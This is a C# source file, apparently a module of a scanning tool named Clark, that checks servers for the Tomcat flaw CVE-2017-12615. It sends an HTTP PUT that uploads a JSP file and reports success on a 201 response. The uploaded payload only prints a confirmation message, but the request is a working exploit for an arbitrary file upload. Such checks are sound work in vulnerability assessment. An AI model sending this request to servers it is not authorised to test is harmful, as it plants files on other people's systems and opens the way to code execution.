using Clark.Attack.Common.Interfaces;
using Clark.Attack.Common.Models;
using Clark.Attack.FileUpload.Models;
using Clark.Common.Models;
using Clark.Common.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Clark.Attack.FileUpload
{
    public class Processor : IAttack
    {
        public string Name { get { return "File Upload Attack"; } set { } }

        #region Private
        private static List<FileUploadAttack> _fileUploads = new List<FileUploadAttack>()
        {
            new FileUploadAttack(){
                Name = "CVE-2017-12615", //https://github.com/breaktoprotect/CVE-2017-12615
                HTTPVerb = "PUT",
                FilePath= "/hogarth45.jsp/",
                Body = "<% out.write(\"<html><body><h3>[+] Hogarth45 JSP upload successfully.</h3></body></html>\"); %>",
                 SuccessResponseHTTPCode = new List<int>(){
                     201
                 }
            }
        };

        #endregion


        public AttackResult Check(AttackRequest request)
        {
            var result = new AttackResult();

            foreach (var fua in _fileUploads)
            {
                var webRequest = new WebPageRequest();
                webRequest.Address = request.URL + fua.FilePath;
                webRequest.Method = fua.HTTPVerb;
                webRequest.RequestBody = fua.Body;
                webRequest.Log = true;

                WebPageLoader.Load(webRequest);

                int responseCode = 0;

                int.TryParse(webRequest.Response.Code, out responseCode);

                if (fua.SuccessResponseHTTPCode.Contains(responseCode))
                {
                    result.Success = true;
                    result.Results.Enqueue("CVE-2017-12615 success: " + webRequest.Address);
                }
            }

            return result;
        }
    }
}
